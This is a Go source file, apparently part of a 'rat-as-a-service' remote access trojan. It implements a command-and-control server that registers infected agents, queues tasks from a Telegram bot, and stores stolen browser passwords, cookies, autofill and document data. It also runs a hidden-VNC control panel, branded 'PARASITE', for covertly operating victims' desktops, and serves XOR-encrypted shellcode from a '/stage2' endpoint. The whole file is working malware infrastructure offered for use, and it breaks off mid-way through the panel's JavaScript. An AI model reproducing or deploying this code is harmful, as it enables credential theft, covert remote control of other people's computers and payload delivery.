package c2server

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"rat-as-a-service/config"

	"github.com/gorilla/websocket"
)

// WebSocket upgrader
var upgrader = websocket.Upgrader{
	CheckOrigin: func(r *http.Request) bool {
		return true // Allow all origins for development
	},
}

// HVNC WebSocket message types
type WSMessage struct {
	Type      string      `json:"type"`
	AgentID   string      `json:"agent_id,omitempty"`
	Data      interface{} `json:"data,omitempty"`
	Timestamp time.Time   `json:"timestamp"`
}

// HVNC Session tracking
type HVNCSession struct {
	AgentID     string                   `json:"agent_id"`
	Active      bool                     `json:"active"`
	LastFrame   time.Time                `json:"last_frame"`
	Connections map[*websocket.Conn]bool `json:"-"`
	mu          sync.RWMutex             `json:"-"`
}

// Global HVNC sessions
var hvncSessions = make(map[string]*HVNCSession)
var hvncMutex sync.RWMutex

type C2Server struct {
	agents         map[string]*config.Agent
	tasks          map[string]*config.Task
	agentTasks     map[string][]*config.Task // agentID -> pending tasks
	taskResults    map[string]*config.TaskResult
	screenshotsDir string
	mutex          sync.RWMutex
}

func NewC2Server() *C2Server {
	// Create screenshots directory
	screenshotsDir := "screenshots"
	if err := os.MkdirAll(screenshotsDir, 0755); err != nil {
		log.Printf("Warning: Failed to create screenshots directory: %v", err)
	}

	return &C2Server{
		agents:         make(map[string]*config.Agent),
		tasks:          make(map[string]*config.Task),
		agentTasks:     make(map[string][]*config.Task),
		taskResults:    make(map[string]*config.TaskResult),
		screenshotsDir: screenshotsDir,
	}
}

// Agent Registration
func (c2 *C2Server) handleRegister(w http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	var agent config.Agent
	if err := json.NewDecoder(r.Body).Decode(&agent); err != nil {
		http.Error(w, "Invalid JSON", http.StatusBadRequest)
		return
	}

	c2.mutex.Lock()
	defer c2.mutex.Unlock()

	// Generate ID if not provided
	if agent.ID == "" {
		agent.ID = config.GenerateID()
	}

	agent.LastSeen = time.Now()
	agent.Status = config.STATUS_ACTIVE
	agent.IPAddress = r.RemoteAddr

	c2.agents[agent.ID] = &agent
	c2.agentTasks[agent.ID] = []*config.Task{}

	log.Printf("[REGISTER] New agent: %s (%s@%s)", agent.ID, agent.Username, agent.Hostname)

	response := map[string]interface{}{
		"status":   "success",
		"agent_id": agent.ID,
		"message":  "Agent registered successfully",
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(response)
}

// Agent Beacon (Check for tasks)
func (c2 *C2Server) handleBeacon(w http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	var beacon config.BeaconRequest
	if err := json.NewDecoder(r.Body).Decode(&beacon); err != nil {
		http.Error(w, "Invalid JSON", http.StatusBadRequest)
		return
	}

	c2.mutex.Lock()
	defer c2.mutex.Unlock()

	// Update agent last seen
	if agent, exists := c2.agents[beacon.AgentID]; exists {
		agent.LastSeen = time.Now()
		agent.Status = config.STATUS_ACTIVE
	} else {
		http.Error(w, "Agent not found", http.StatusNotFound)
		return
	}

	response := config.BeaconResponse{HasTask: false}

	// Check for pending tasks
	if tasks, exists := c2.agentTasks[beacon.AgentID]; exists && len(tasks) > 0 {
		// Get the first pending task
		task := tasks[0]
		response.HasTask = true
		response.TaskID = task.ID
		response.Task = task

		// Remove task from pending queue
		c2.agentTasks[beacon.AgentID] = tasks[1:]

		log.Printf("[BEACON] Sending task %s to agent %s: %s", task.ID, beacon.AgentID, task.Type)
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(response)
}

// Task Result Submission
func (c2 *C2Server) handleResult(w http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	var result config.TaskResult
	if err := json.NewDecoder(r.Body).Decode(&result); err != nil {
		http.Error(w, "Invalid JSON", http.StatusBadRequest)
		return
	}

	c2.mutex.Lock()
	defer c2.mutex.Unlock()

	// Store result
	c2.taskResults[result.TaskID] = &result

	// Handle screenshot data if present
	if task, exists := c2.tasks[result.TaskID]; exists {
		if task.Type == config.TASK_SCREENSHOT && result.Success && strings.Contains(result.Output, "---SCREENSHOT_DATA---") {
			c2.saveScreenshot(&result)
		}

		// Handle HVNC screenshot data
		if task.Type == config.TASK_HVNC_SCREENSHOT && result.Success && result.ScreenshotData != "" {
			// Broadcast HVNC frame to connected WebSocket clients
			c2.BroadcastHVNCFrame(result.AgentID, result.ScreenshotData)
			log.Printf("[HVNC] Broadcasted frame for agent %s", result.AgentID)
		}

		// Handle credential data
		if result.CredentialData != nil && result.Success {
			c2.saveCredentialData(&result)
		}
	}

	// Update task status
	if task, exists := c2.tasks[result.TaskID]; exists {
		if result.Success {
			task.Status = "completed"
			task.Result = result.Output
		} else {
			task.Status = "failed"
			task.Error = result.Error
		}
		now := time.Now()
		task.CompletedAt = &now
	}

	log.Printf("[RESULT] Task %s from agent %s: Success=%v", result.TaskID, result.AgentID, result.Success)

	response := map[string]string{"status": "success"}
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(response)
}

// Save screenshot data to file
func (c2 *C2Server) saveScreenshot(result *config.TaskResult) {
	parts := strings.Split(result.Output, "---SCREENSHOT_DATA---")
	if len(parts) != 2 {
		log.Printf("Invalid screenshot data format for task %s", result.TaskID)
		return
	}

	base64Data := strings.TrimSpace(parts[1])
	imageData, err := base64.StdEncoding.DecodeString(base64Data)
	if err != nil {
		log.Printf("Failed to decode screenshot base64 for task %s: %v", result.TaskID, err)
		return
	}

	// Create filename with timestamp and agent info
	timestamp := time.Unix(result.Timestamp, 0).Format("2006-01-02_15-04-05")
	filename := fmt.Sprintf("screenshot_%s_%s_%s.png", result.AgentID[:8], result.TaskID[:8], timestamp)
	filepath := filepath.Join(c2.screenshotsDir, filename)

	if err := ioutil.WriteFile(filepath, imageData, 0644); err != nil {
		log.Printf("Failed to save screenshot for task %s: %v", result.TaskID, err)
		return
	}

	log.Printf("[SCREENSHOT] Saved screenshot for task %s: %s (%d bytes)", result.TaskID, filename, len(imageData))

	// Update the result output to remove the base64 data and add file path
	result.Output = parts[0] + fmt.Sprintf("\nScreenshot saved: %s", filename)
}

// Save credential data to file
func (c2 *C2Server) saveCredentialData(result *config.TaskResult) {
	if result.CredentialData == nil {
		return
	}

	// Create credentials directory if it doesn't exist
	credentialsDir := "credentials"
	if err := os.MkdirAll(credentialsDir, 0755); err != nil {
		log.Printf("Failed to create credentials directory: %v", err)
		return
	}

	// Create filename with timestamp and agent info
	timestamp := time.Unix(result.Timestamp, 0).Format("2006-01-02_15-04-05")
	filename := fmt.Sprintf("credentials_%s_%s_%s.json", result.AgentID[:8], result.TaskID[:8], timestamp)
	filepath := filepath.Join(credentialsDir, filename)

	// Convert credential data to JSON
	jsonData, err := json.MarshalIndent(result.CredentialData, "", "  ")
	if err != nil {
		log.Printf("Failed to marshal credential data for task %s: %v", result.TaskID, err)
		return
	}

	// Save to file
	if err := ioutil.WriteFile(filepath, jsonData, 0644); err != nil {
		log.Printf("Failed to save credential data for task %s: %v", result.TaskID, err)
		return
	}

	// Count stolen items for logging
	creds := result.CredentialData
	totalItems := len(creds.BrowserPasswords) + len(creds.BrowserCookies) +
		len(creds.AutofillData) + len(creds.DocumentData)

	log.Printf("[CREDENTIALS] Saved %d stolen items for task %s: %s (%d bytes)",
		totalItems, result.TaskID, filename, len(jsonData))

	// Update the result output to include file path
	result.Output += fmt.Sprintf("\nCredentials saved: %s", filename)
}

// Health Check
func (c2 *C2Server) handleHealth(w http.ResponseWriter, r *http.Request) {
	c2.mutex.RLock()
	defer c2.mutex.RUnlock()

	activeAgents := 0
	for _, agent := range c2.agents {
		if time.Since(agent.LastSeen) < 2*config.BEACON_INTERVAL {
			activeAgents++
		}
	}

	response := map[string]interface{}{
		"status":        "healthy",
		"total_agents":  len(c2.agents),
		"active_agents": activeAgents,
		"pending_tasks": len(c2.tasks),
		"uptime":        time.Since(time.Now()).String(),
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(response)
}

// Add Task (called by Telegram bot)
func (c2 *C2Server) AddTask(agentID, taskType, command string, parameters map[string]interface{}) string {
	c2.mutex.Lock()
	defer c2.mutex.Unlock()

	task := &config.Task{
		ID:         config.GenerateID(),
		AgentID:    agentID,
		Type:       taskType,
		Command:    command,
		Parameters: parameters,
		Status:     "pending",
		CreatedAt:  time.Now(),
	}

	c2.tasks[task.ID] = task
	c2.agentTasks[agentID] = append(c2.agentTasks[agentID], task)

	log.Printf("[TASK] Added task %s for agent %s: %s", task.ID, agentID, taskType)
	return task.ID
}

// Add Task with full configuration (called by Telegram bot for advanced tasks)
func (c2 *C2Server) AddTaskWithConfig(agentID string, task *config.Task) string {
	c2.mutex.Lock()
	defer c2.mutex.Unlock()

	task.ID = config.GenerateID()
	task.AgentID = agentID
	task.Status = "pending"
	task.CreatedAt = time.Now()

	c2.tasks[task.ID] = task
	c2.agentTasks[agentID] = append(c2.agentTasks[agentID], task)

	log.Printf("[TASK] Added configured task %s for agent %s: %s", task.ID, agentID, task.Type)
	return task.ID
}

// Get Agents (for Telegram bot)
func (c2 *C2Server) GetAgents() []*config.Agent {
	c2.mutex.RLock()
	defer c2.mutex.RUnlock()

	agents := make([]*config.Agent, 0, len(c2.agents))
	for _, agent := range c2.agents {
		// Update status based on last seen
		if time.Since(agent.LastSeen) > 3*config.BEACON_INTERVAL {
			agent.Status = config.STATUS_INACTIVE
		}
		if time.Since(agent.LastSeen) > 10*config.BEACON_INTERVAL {
			agent.Status = config.STATUS_DEAD
		}
		agents = append(agents, agent)
	}
	return agents
}

// Get Task Results (for Telegram bot)
func (c2 *C2Server) GetTaskResult(taskID string) *config.TaskResult {
	c2.mutex.RLock()
	defer c2.mutex.RUnlock()

	return c2.taskResults[taskID]
}

// Legacy endpoints for backward compatibility
func (c2 *C2Server) handleLegacyStage2(w http.ResponseWriter, r *http.Request) {
	// Simple calc.exe shellcode for demonstration
	calcShellcode := []byte{
		0x48, 0x31, 0xc9, 0x48, 0x81, 0xe9, 0xdd, 0xff, 0xff, 0xff, 0x48, 0x8d, 0x05, 0xef, 0xff, 0xff,
		0xff, 0x48, 0xbb, 0x70, 0x85, 0x11, 0x65, 0x4e, 0x4f, 0x7e, 0x23, 0x48, 0x31, 0x58, 0x27, 0x48,
		0x2d, 0xf8, 0xff, 0xff, 0xff, 0xe2, 0xf4, 0x8c, 0xcd, 0x93, 0x01, 0x1e, 0xa7, 0x1e, 0x23, 0x30,
	}

	encrypted := config.XOREncrypt(calcShellcode, config.XOR_KEY)
	encrypted = append(encrypted, 0xFF) // End marker

	w.Header().Set("Content-Type", "application/octet-stream")
	w.Write(encrypted)
}

// Screenshot endpoints
func (c2 *C2Server) handleScreenshots(w http.ResponseWriter, r *http.Request) {
	if r.Method == "GET" {
		// List available screenshots
		c2.listScreenshots(w, r)
	} else {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
	}
}

func (c2 *C2Server) listScreenshots(w http.ResponseWriter, r *http.Request) {
	files, err := ioutil.ReadDir(c2.screenshotsDir)
	if err != nil {
		http.Error(w, "Failed to read screenshots directory", http.StatusInternalServerError)
		return
	}

	screenshots := make([]map[string]interface{}, 0)
	for _, file := range files {
		if !file.IsDir() && strings.HasSuffix(file.Name(), ".png") {
			screenshots = append(screenshots, map[string]interface{}{
				"filename": file.Name(),
				"size":     file.Size(),
				"modified": file.ModTime(),
				"url":      fmt.Sprintf("/screenshots/%s", file.Name()),
			})
		}
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"screenshots": screenshots,
		"count":       len(screenshots),
	})
}

func (c2 *C2Server) handleScreenshotFile(w http.ResponseWriter, r *http.Request) {
	if r.Method != "GET" {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	// Extract filename from URL path
	filename := strings.TrimPrefix(r.URL.Path, "/screenshots/")
	if filename == "" {
		http.Error(w, "Filename required", http.StatusBadRequest)
		return
	}

	// Security check - prevent directory traversal
	if strings.Contains(filename, "..") || strings.Contains(filename, "/") || strings.Contains(filename, "\\") {
		http.Error(w, "Invalid filename", http.StatusBadRequest)
		return
	}

	filepath := filepath.Join(c2.screenshotsDir, filename)

	// Check if file exists
	if _, err := os.Stat(filepath); os.IsNotExist(err) {
		http.Error(w, "Screenshot not found", http.StatusNotFound)
		return
	}

	// Serve the file
	w.Header().Set("Content-Type", "image/png")
	w.Header().Set("Content-Disposition", fmt.Sprintf("inline; filename=\"%s\"", filename))
	http.ServeFile(w, r, filepath)
}

func (c2 *C2Server) StartHTTPServer() {
	mux := http.NewServeMux()

	// New API endpoints
	mux.HandleFunc(config.ENDPOINT_REGISTER, c2.handleRegister)
	mux.HandleFunc(config.ENDPOINT_BEACON, c2.handleBeacon)
	mux.HandleFunc(config.ENDPOINT_RESULT, c2.handleResult)
	mux.HandleFunc(config.ENDPOINT_HEALTH, c2.handleHealth)
	mux.HandleFunc(config.ENDPOINT_SCREENSHOTS, c2.handleScreenshots)
	mux.HandleFunc("/screenshots/", c2.handleScreenshotFile) // For individual files

	// HVNC Web Interface endpoints
	mux.HandleFunc("/hvnc", c2.handleHVNCViewer)
	mux.HandleFunc("/hvnc/", c2.handleHVNCAssets)
	mux.HandleFunc("/hvnc/ws", c2.handleHVNCWebSocket)
	mux.HandleFunc("/hvnc/api/agents", c2.handleHVNCAgentList)

	// Legacy endpoints
	mux.HandleFunc("/stage2", c2.handleLegacyStage2)

	server := &http.Server{
		Addr:    config.C2_SERVER_HOST + ":" + config.C2_SERVER_PORT,
		Handler: mux,
	}

	log.Printf("C2 Server starting on %s:%s", config.C2_SERVER_HOST, config.C2_SERVER_PORT)
	log.Printf("Endpoints available:")
	log.Printf("  POST %s - Agent registration", config.ENDPOINT_REGISTER)
	log.Printf("  POST %s - Agent beacon/task polling", config.ENDPOINT_BEACON)
	log.Printf("  POST %s - Task result submission", config.ENDPOINT_RESULT)
	log.Printf("  GET  %s - Health check", config.ENDPOINT_HEALTH)
	log.Printf("  GET  %s - List screenshots", config.ENDPOINT_SCREENSHOTS)
	log.Printf("  GET  /screenshots/<filename> - Serve screenshot files")
	log.Printf("  GET  /hvnc - HVNC Web Interface")
	log.Printf("  GET  /hvnc/hvnc.js - HVNC JavaScript")
	log.Printf("  WS   /hvnc/ws - HVNC WebSocket")
	log.Printf("  GET  /hvnc/api/agents - HVNC Agent List API")
	log.Printf("  GET  /stage2 - Legacy shellcode delivery")

	if err := server.ListenAndServe(); err != nil {
		log.Fatal("Failed to start C2 server:", err)
	}
}

// Global server instance for Telegram bot to access
var GlobalC2Server *C2Server

// HVNC Web Interface Methods

// Serve the HVNC viewer interface
func (c2 *C2Server) handleHVNCViewer(w http.ResponseWriter, r *http.Request) {
	if r.Method != "GET" {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	html := `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PARASITE - HVNC Control Panel</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #0f0f0f 0%, #1a1a1a 100%);
            color: #ffffff;
            overflow: hidden;
        }
        
        .header {
            background: rgba(0, 0, 0, 0.9);
            padding: 10px 20px;
            border-bottom: 2px solid #ff4444;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .logo {
            font-size: 24px;
            font-weight: bold;
            color: #ff4444;
            text-shadow: 0 0 10px #ff4444;
        }
        
        .controls {
            display: flex;
            gap: 10px;
            align-items: center;
        }
        
        select, button {
            background: rgba(255, 255, 255, 0.1);
            color: #ffffff;
            border: 1px solid #ff4444;
            padding: 8px 15px;
            border-radius: 4px;
            cursor: pointer;
            transition: all 0.3s ease;
        }
        
        button:hover {
            background: #ff4444;
            transform: translateY(-1px);
        }
        
        button:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }
        
        .status {
            display: flex;
            gap: 10px;
            align-items: center;
        }
        
        .status-dot {
            width: 10px;
            height: 10px;
            border-radius: 50%;
            background: #444;
            animation: pulse 2s infinite;
        }
        
        .status-dot.connected {
            background: #44ff44;
        }
        
        .status-dot.active {
            background: #ffaa00;
        }
        
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }
        
        .main-container {
            display: flex;
            height: calc(100vh - 70px);
        }
        
        .desktop-container {
            flex: 1;
            display: flex;
            justify-content: center;
            align-items: center;
            background: #000;
            position: relative;
            overflow: hidden;
        }
        
        #desktop-canvas {
            max-width: 100%;
            max-height: 100%;
            border: 2px solid #ff4444;
            cursor: crosshair;
            box-shadow: 0 0 20px rgba(255, 68, 68, 0.3);
        }
        
        .sidebar {
            width: 300px;
            background: rgba(0, 0, 0, 0.8);
            border-left: 2px solid #ff4444;
            padding: 20px;
            overflow-y: auto;
        }
        
        .sidebar h3 {
            color: #ff4444;
            margin-bottom: 15px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        
        .info-group {
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 68, 68, 0.3);
            border-radius: 4px;
            padding: 15px;
            margin-bottom: 20px;
        }
        
        .info-item {
            display: flex;
            justify-content: space-between;
            margin-bottom: 8px;
        }
        
        .info-label {
            color: #cccccc;
            font-size: 12px;
            text-transform: uppercase;
        }
        
        .info-value {
            color: #ffffff;
            font-weight: bold;
        }
        
        .keyboard-input {
            width: 100%;
            background: rgba(255, 255, 255, 0.1);
            border: 1px solid #ff4444;
            color: #ffffff;
            padding: 10px;
            border-radius: 4px;
            margin-bottom: 10px;
        }
        
        .keyboard-input:focus {
            outline: none;
            box-shadow: 0 0 10px rgba(255, 68, 68, 0.5);
        }
        
        .loading {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            text-align: center;
            color: #ff4444;
        }
        
        .spinner {
            border: 3px solid rgba(255, 68, 68, 0.3);
            border-radius: 50%;
            border-top: 3px solid #ff4444;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .no-session {
            text-align: center;
            color: #888;
            font-size: 18px;
            margin-top: 50px;
        }
    </style>
</head>
<body>
    <div class="header">
        <div class="logo">☠️ PARASITE HVNC</div>
        <div class="controls">
            <select id="agent-select">
                <option value="">Select Agent...</option>
            </select>
            <button id="start-session">Start HVNC</button>
            <button id="stop-session" disabled>Stop HVNC</button>
            <button id="take-screenshot">Screenshot</button>
            <div class="status">
                <span>WebSocket:</span>
                <div id="ws-status" class="status-dot"></div>
                <span>HVNC:</span>
                <div id="hvnc-status" class="status-dot"></div>
            </div>
        </div>
    </div>
    
    <div class="main-container">
        <div class="desktop-container">
            <canvas id="desktop-canvas"></canvas>
            <div id="loading" class="loading" style="display: none;">
                <div class="spinner"></div>
                <div>Connecting to HVNC session...</div>
            </div>
            <div id="no-session" class="no-session">
                Select an agent and start an HVNC session to begin
            </div>
        </div>
        
        <div class="sidebar">
            <h3>Session Info</h3>
            <div class="info-group">
                <div class="info-item">
                    <span class="info-label">Agent ID:</span>
                    <span id="current-agent" class="info-value">None</span>
                </div>
                <div class="info-item">
                    <span class="info-label">Status:</span>
                    <span id="session-status" class="info-value">Inactive</span>
                </div>
                <div class="info-item">
                    <span class="info-label">Last Frame:</span>
                    <span id="last-frame" class="info-value">Never</span>
                </div>
                <div class="info-item">
                    <span class="info-label">Resolution:</span>
                    <span id="resolution" class="info-value">0x0</span>
                </div>
            </div>
            
            <h3>Keyboard Input</h3>
            <div class="info-group">
                <input type="text" id="keyboard-input" class="keyboard-input" placeholder="Type here and press Enter...">
                <button id="send-text" style="width: 100%;">Send Text</button>
            </div>
            
            <h3>Quick Actions</h3>
            <div class="info-group">
                <button onclick="sendKeyboard('ctrl+c')" style="width: 100%; margin-bottom: 5px;">Copy (Ctrl+C)</button>
                <button onclick="sendKeyboard('ctrl+v')" style="width: 100%; margin-bottom: 5px;">Paste (Ctrl+V)</button>
                <button onclick="sendKeyboard('alt+tab')" style="width: 100%; margin-bottom: 5px;">Alt+Tab</button>
                <button onclick="sendKeyboard('ctrl+alt+del')" style="width: 100%; margin-bottom: 5px;">Ctrl+Alt+Del</button>
                <button onclick="sendKeyboard('win')" style="width: 100%;">Windows Key</button>
            </div>
        </div>
    </div>
    
    <script src="/hvnc/hvnc.js"></script>
</body>
</html>`

	w.Header().Set("Content-Type", "text/html")
	w.Write([]byte(html))
}

// Serve HVNC JavaScript asset
func (c2 *C2Server) handleHVNCAssets(w http.ResponseWriter, r *http.Request) {
	if r.URL.Path == "/hvnc/hvnc.js" {
		js := `
class HVNCController {
    constructor() {
        this.ws = null;
        this.canvas = document.getElementById('desktop-canvas');
        this.ctx = this.canvas.getContext('2d');
        this.currentAgent = null;
        this.sessionActive = false;
        this.lastMousePos = { x: 0, y: 0 };
        this.reconnectAttempts = 0;
        this.maxReconnectAttempts = 5;
        this.streamingActive = false;
        this.lastFrameTime = 0;
        this.actualResolution = { width: 0, height: 0 };
        
        this.initializeEventListeners();
        this.loadAgents();
        this.connectWebSocket();
    }
    
    initializeEventListeners() {
        // Agent selection
        document.getElementById('agent-select').addEventListener('change', (e) => {
            this.currentAgent = e.target.value;
            document.getElementById('current-agent').textContent = this.currentAgent || 'None';
            // Reset session state when changing agents
            if (this.sessionActive) {
                this.updateSessionStatus({ active: false });
            }
        });
        
        // Session controls with improved error handling
        document.getElementById('start-session').addEventListener('click', () => this.startSession());
        document.getElementById('stop-session').addEventListener('click', () => this.stopSession());
        document.getElementById('take-screenshot').addEventListener('click', () => this.takeScreenshot());
        
        // Canvas mouse events with improved coordinate mapping
        this.canvas.addEventListener('click', (e) => this.handleCanvasClick(e));
        this.canvas.addEventListener('mousemove', (e) => this.handleCanvasMouseMove(e));
        this.canvas.addEventListener('contextmenu', (e) => {
            e.preventDefault();
            this.handleCanvasRightClick(e);
        });
        
        // Make canvas focusable for keyboard events
        this.canvas.setAttribute('tabindex', '0');
        this.canvas.addEventListener('focus', () => {
            console.log('Canvas focused - keyboard capture enabled');
        });
        
        // Keyboard input
        document.getElementById('keyboard-input').addEventListener('keypress', (e) => {
            if (e.key === 'Enter') {
                this.sendText();
            }
        });
        document.getElementById('send-text').addEventListener('click', () => this.sendText());
        
        // Global keyboard capture when canvas is focused
        document.addEventListener('keydown', (e) => {
            if (document.activeElement === this.canvas && this.sessionActive) {
                e.preventDefault();
                this.sendKeyEvent(e.key, 'down');
            }
        });
        
        document.addEventListener('keyup', (e) => {
            if (document.activeElement === this.canvas && this.sessionActive) {
                e.preventDefault();
                this.sendKeyEvent(e.key, 'up');
            }
        });
    }
    
    connectWebSocket() {
        const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
        this.ws = new WebSocket(protocol + '//' + window.location.host + '/hvnc/ws');
        
        this.ws.onopen = () => {
            console.log('WebSocket connected');
            document.getElementById('ws-status').classList.add('connected');
            this.reconnectAttempts = 0;
        };
        
        this.ws.onmessage = (event) => {
            const message = JSON.parse(event.data);
            this.handleWebSocketMessage(message);
        };
        
        this.ws.onclose = () => {
            console.log('WebSocket disconnected');
            document.getElementById('ws-status').classList.remove('connected');
            
            // Attempt to reconnect with exponential backoff
            if (this.reconnectAttempts < this.maxReconnectAttempts) {
                this.reconnectAttempts++;
                const delay = Math.min(1000 * Math.pow(2, this.reconnectAttempts), 30000);
                console.log('Reconnecting in ' + delay + 'ms (attempt ' + this.reconnectAttempts + ')');
                setTimeout(() => this.connectWebSocket(), delay);
            } else {
                console.error('Max reconnection attempts reached');
                this.showError('Connection lost. Please refresh the page.');
            }
        };
        
        this.ws.onerror = (error) => {
            console.error('WebSocket error:', error);
        };
    }
    
    handleWebSocketMessage(message) {
        switch (message.type) {
            case 'desktop_frame':
                this.updateDesktopFrame(message.data);
                break;
            case 'session_status':
                this.updateSessionStatus(message.data);
                break;
            case 'agents_list':
                this.updateAgentsList(message.data);
                break;
            case 'error':
                console.error('Server error:', message.data);
                this.showError(message.data);
                break;
        }
    }
    
    updateDesktopFrame(frameData) {
        const img = new Image();
        img.onload = () => {
            // Store actual resolution for coordinate mapping
            this.actualResolution.width = img.width;
            this.actualResolution.height = img.height;
            
            // Update canvas size to match image
            this.canvas.width = img.width;
            this.canvas.height = img.height;
            this.ctx.drawImage(img, 0, 0);
            
            // Update UI elements
            document.getElementById('resolution').textContent = img.width + 'x' + img.height;
            document.getElementById('last-frame').textContent = new Date().toLocaleTimeString();
            document.getElementById('no-session').style.display = 'none';
            document.getElementById('loading').style.display = 'none';
            
            this.lastFrameTime = Date.now();
            
            console.log('Frame updated: ' + img.width + 'x' + img.height);
        };
        img.onerror = () => {
            console.error('Failed to load desktop frame');
            this.showError('Failed to load desktop frame');
        };
        img.src = 'data:image/png;base64,' + frameData;
    }
    
    updateSessionStatus(status) {
        console.log('Session status update:', status);
        
        this.sessionActive = status.active;
        this.streamingActive = status.active;
        
        document.getElementById('session-status').textContent = status.active ? 'Active' : 'Inactive';
        document.getElementById('start-session').disabled = status.active;
        document.getElementById('stop-session').disabled = !status.active;
        document.getElementById('take-screenshot').disabled = !status.active;
        
        if (status.active) {
            document.getElementById('hvnc-status').classList.add('active');
            // Focus canvas for keyboard input
            setTimeout(() => this.canvas.focus(), 100);
        } else {
            document.getElementById('hvnc-status').classList.remove('active');
            // Clear canvas when session stops
            this.ctx.clearRect(0, 0, this.canvas.width, this.canvas.height);
            document.getElementById('no-session').style.display = 'block';
            document.getElementById('loading').style.display = 'none';
        }
    }
    
    updateAgentsList(agents) {
        const select = document.getElementById('agent-select');
        const currentValue = select.value;
        select.innerHTML = '<option value="">Select Agent...</option>';
        
        agents.forEach(agent => {
            const option = document.createElement('option');
            option.value = agent.id;
            option.textContent = agent.id.substring(0, 8) + ' (' + agent.hostname + ')';
            if (option.value === currentValue) {
                option.selected = true;
            }
            select.appendChild(option);
        });
    }
    
    loadAgents() {
        fetch('/hvnc/api/agents')
            .then(response => response.json())
            .then(agents => this.updateAgentsList(agents))
            .catch(error => {
                console.error('Failed to load agents:', error);
                this.showError('Failed to load agents list');
            });
    }
    
    startSession() {
        if (!this.currentAgent) {
            this.showError('Please select an agent first');
            return;
        }
        
        if (this.sessionActive) {
            this.showError('Session is already active');
            return;
        }
        
        console.log('Starting HVNC session for agent:', this.currentAgent);
        document.getElementById('loading').style.display = 'block';
        document.getElementById('start-session').disabled = true;
        
        this.sendWebSocketMessage({
            type: 'start_session',
            agent_id: this.currentAgent
        });
        
        // Set timeout for session start
        setTimeout(() => {
            if (!this.sessionActive) {
                document.getElementById('loading').style.display = 'none';
                document.getElementById('start-session').disabled = false;
                this.showError('Session start timeout - agent may be unresponsive');
            }
        }, 30000);
    }
    
    stopSession() {
        if (!this.sessionActive) {
            this.showError('No active session to stop');
            return;
        }
        
        console.log('Stopping HVNC session for agent:', this.currentAgent);
        document.getElementById('stop-session').disabled = true;
        
        this.sendWebSocketMessage({
            type: 'stop_session',
            agent_id: this.currentAgent
        });
        
        // Force update UI after timeout if no response
        setTimeout(() => {
            if (this.sessionActive) {
                console.warn('Stop session timeout - forcing UI update');
                this.updateSessionStatus({ active: false });
            }
        }, 10000);
    }
    
    takeScreenshot() {
        if (!this.sessionActive) return;
        
        this.sendWebSocketMessage({
            type: 'take_screenshot',
            agent_id: this.currentAgent
        });
    }
    
    handleCanvasClick(e) {
        if (!this.sessionActive) return;
        
        const coords = this.getScaledCoordinates(e);
        
        console.log('Canvas click: display(' + e.clientX + ', ' + e.clientY + ') -> scaled(' + coords.x + ', ' + coords.y + ')');
        
        this.sendWebSocketMessage({
            type: 'mouse_event',
            agent_id: this.currentAgent,
            data: {
                action: 'click',
                x: coords.x,
                y: coords.y,
                button: e.button === 2 ? 'right' : 'left'
            }
        });
    }
    
    handleCanvasRightClick(e) {
        this.handleCanvasClick(e);
    }
    
    handleCanvasMouseMove(e) {
        if (!this.sessionActive) return;
        
        const coords = this.getScaledCoordinates(e);
        
        // Throttle mouse move events
        if (Math.abs(coords.x - this.lastMousePos.x) > 3 || Math.abs(coords.y - this.lastMousePos.y) > 3) {
            this.lastMousePos = { x: coords.x, y: coords.y };
            
            this.sendWebSocketMessage({
                type: 'mouse_event',
                agent_id: this.currentAgent,
                data: {
                    action: 'move',
                    x: coords.x,
                    y: coords.y
                }
            });
        }
    }
    
    getScaledCoordinates(e) {
        const rect = this.canvas.getBoundingClientRect();
        
        // Calculate the scale factor between displayed canvas and actual resolution
        const scaleX = this.actualResolution.width / rect.width;
        const scaleY = this.actualResolution.height / rect.height;
        
        // Get click position relative to canvas
        const relativeX = e.clientX - rect.left;
        const relativeY = e.clientY - rect.top;
        
        // Scale to actual resolution
        const scaledX = Math.round(relativeX * scaleX);
        const scaledY = Math.round(relativeY * scaleY);
        
        return { x: scaledX, y: scaledY };
    }
    
    sendText() {
        const input = document.getElementById('keyboard-input');
        const text = input.value.trim();
        
        if (!text || !this.sessionActive) return;
        
        this.sendWebSocketMessage({
            type: 'keyboard_event',
            agent_id: this.currentAgent,
            data: {
                text: text
            }
        });
        
        input.value = '';
    }
    
    sendKeyEvent(key, action) {
        this.sendWebSocketMessage({
            type: 'keyboard_event',
            agent_id: this.currentAgent,
            data: {
                key: key,
                action: action
            }
        });
    }
    
